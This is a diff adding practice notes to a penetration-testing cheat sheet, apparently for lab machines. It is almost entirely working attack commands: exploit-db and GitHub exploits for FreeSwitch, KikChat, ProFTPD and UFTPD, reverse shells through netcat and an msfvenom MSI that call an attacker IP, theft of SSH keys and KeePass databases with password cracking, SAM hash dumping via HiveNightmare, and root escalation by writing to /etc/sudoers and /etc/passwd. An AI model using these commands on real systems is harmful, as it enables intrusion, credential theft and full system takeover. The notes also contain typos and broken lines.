@@ -528,7 +528,106 @@ On Domain Controllers, if you got credentials you may use psexec:
 - https://medium.com/r3d-buck3t/attack-insecure-rsync-service-928951af34ed
 	- Replace ssh keys 
 - Download entire FTP: wget -r ftp://anonymous@192.168.237.127:30021
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Extra Practice Notes:
+
+Foothold: 
+	Windwos: 
+		- mysql is running:
+			- mysql -h <IP> -u <user> -p <pass>
+			- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+				- Go down to the windows and linux sections for remote code execution 
+		- Unified remote 3: https://www.exploit-db.com/exploits/49587
+		- FreeSwitch: https://www.exploit-db.com/exploits/47799
+			- Download the above exploit 
+			- python3 exp_switch.py <IP> <command>
+				- upload netcat
+			- python3 exp_switch.py <IP> ".\nc64.exe -nv <attacker IP> 445 -e cmd.exe"
+		- kikchat: https://www.exploit-db.com/exploits/30235#:~:text=KikChat%20-%20Local%20File%20Inclusion,%2F%20Remote%20Code%20Execution%20EDB-ID%3A%2030235
+			- curl -v http://<IP>/8678576453/rooms/get.php?name=info.php&ROOM="<?php phpinfo()+?>"
+			- curl -s http://<IP>/8678576453/rooms/get.php?name=shell.php&ROOM="<php file_put_contents('nc.bat',file_get_contens('http://192.168.XX.XX nc.txt'));system('nc.bat');usleep(100000);system('nc.exe -vn 192.168.XX.XX 9001 -cmd.exe');+?>"
+		- Blogengine: Lookup exploit 
 		
+	Linux:
+		- If ProFTPD 1.3.5 is running on 3825: 
+			- https://github.com/t0kx/exploit-CVE-2015-3306
+			- python3 exploit.py --host <IP> --port 3825 --path
+		- UFTPD traversal: 
+			- https://www.exploit-db.com/exploits/51000
+			- Example: 
+				- sudo nc -lvnp 9001 > shell.kdbx
+				- nc 192.168.1xx.110 21
+					- PORT 192,168,xx,1xx,1,2
+					- RETR ../../../opt/shell.kdbx
+					- keepass2john shell.kdbx > hash.txt
+					- john hash.txt –wordlist=/opt/wordlists/rockyou.txt
+						- open that .kdbx file with the KeePass software.
+		- Student Attendance: https://www.exploit-db.com/exploits/48989
+		- If mountd is running: 
+			- showmount -e <victim IP>
+			- mount -t nfs <victim IP>:/ our_temperory_folder_name/ -no lock
+				- FTP commands
+					- One liner: nc <victim IP> then cpfr /home/<user>/.ssh/id_rsa then cpto
+/var/tmp/id_rsa
+					- chmod 600 id_rsa
+					- ssh -i id_rsa <user>@<iP>
+			
+					
+		
+		
+					
+"/var/www/html/"
+Privelege Escalation: 
+	Windows:
+		- Using winpeas, if the machineis vulnerable to autologon: 
+			- Use credentials to RDP 
+		- Use winpeas:
+			- msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=445 -f
+msi -o reverse_shell.msi
+			- upload the payload to the victim 
+			- On the victim: msiexec /quiet /qn /i reverse_shell.msi
+		- Hive nightmare: https://github.com/GossiTheDog/HiveNightmare/tree/master/HiveNightmare
+			- https://www.hackingarticles.in/windows-privilege-escalation-hivenightmare/
+			- https://thecyberdeets.com/how-i-exploited-the-hive-nightmare-aka-serioussam-cve-2021-36934/
+				- LTDR: run the exe, and then run this command on your machine: 
+					- “python3 secretdump.py -sam SAM-2021-08-19 -system SYSTEM-2021-0819 -security SECURITY-2021-08-19 LOCAL”
+		- Unquoted path
+		- Winpeas result we can see setCreateTokenPrivilege
+			- https://github.com/hatRiot/token-priv/blob/master/poptoke/poptoke/SeCreateTokenPrivilege.cpp
+	Linux: 
+		- If lighttpd running by the root account
+			- echo "<?php echo 'hello';passthru('echo \'www-data ALL=(root) NOPASSWD: ALL\' >>
+/etc/sudoers'); ?>" > root.php
+			- curl -v http://localhost:5000/files/root.php
+		- Splunk running on this machine: https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
+			- python PySplunkWhisperer2_remote.py --host 127.0.0.1 --port 8089 --username
+<user> --password <password> --payload "echo
+'user:pass:0:0:,,,:/root:/bin/bash' >>
+/etc/passwd" --lhost <Attacker IP>
+		- Find readable files: 
+			- find / -group <group> -readable 2>/dev/null
+				- You may also command form you notes above
+				- cat /var/log/auth.log 	
+		- Keybase redirector: https://www.exploit-db.com/exploits/46044
+			- Create a file called keybase_exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(int argc, char **argv)
+{
+setreuid(0,0);
+system("/usr/bin/touch /Im_Root");
+return(0);
+}
+			- gcc keybase_exploit.c -o exploit
+			- env PATH=.:$PATH /usr/bin/keybase-redirector /keybase
+			
+
 			
 			
 
